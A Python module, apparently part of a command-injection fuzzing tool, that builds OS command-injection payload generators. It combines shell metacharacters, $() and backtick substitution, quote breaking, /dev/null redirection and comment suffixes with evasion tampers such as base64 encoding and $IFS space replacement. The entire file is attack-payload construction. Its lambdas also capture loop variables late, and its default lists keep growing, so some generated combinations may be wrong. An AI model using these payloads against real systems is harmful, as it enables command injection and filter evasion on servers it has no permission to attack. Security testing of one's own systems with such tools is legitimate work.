from typing import Generator, Callable

from raycharles.tampers import *

PayloadGenerator = Callable[[str], str]

COMMENT_CHARS = ("#",)
META_CHARS = ("&&", "||", "&", "|", ";")
QUOTE_CHARS = ("'", '"')
SUBSTITUTION_PATTERNS = ("$(%(cmd)s)", "`%(cmd)s`")
ENDINGS = (">/dev/null", "2>/dev/null")


def build_payloads(
    pre_tampers=[
        encode_base64,
    ],
    tampers=[
        add_dollar_and_ats,
        replace_spaces_with_ifs,
    ],
) -> Generator[PayloadGenerator, None, None]:
    tampers.append(lambda x: x)
    pre_tampers.append(lambda x: x)

    for pre_tamper in pre_tampers:
        for tamper in tampers:
            yield lambda cmd: tamper(pre_tamper(cmd))

            for sp in SUBSTITUTION_PATTERNS:
                yield lambda cmd: tamper(sp % {"cmd": pre_tamper(cmd)})

            for mc in META_CHARS:
                yield lambda cmd: tamper(mc + pre_tamper(cmd))

                for cc in COMMENT_CHARS:
                    yield lambda cmd: tamper(mc + pre_tamper(cmd) + cc)

                for end in ENDINGS:
                    yield lambda cmd: tamper(end + mc + pre_tamper(cmd))

                    for cc in COMMENT_CHARS:
                        yield lambda cmd: tamper(end + mc + pre_tamper(cmd) + cc)

            for qc in QUOTE_CHARS:
                for mc in META_CHARS:
                    yield lambda cmd: tamper(qc + mc + pre_tamper(cmd))

                    for cc in COMMENT_CHARS:
                        yield lambda cmd: tamper(qc + mc + pre_tamper(cmd) + cc)

                    for end in ENDINGS:
                        yield lambda cmd: tamper(qc + end + mc + pre_tamper(cmd))

                        for cc in COMMENT_CHARS:
                            yield lambda cmd: tamper(
                                qc + end + mc + pre_tamper(cmd) + cc
                            )
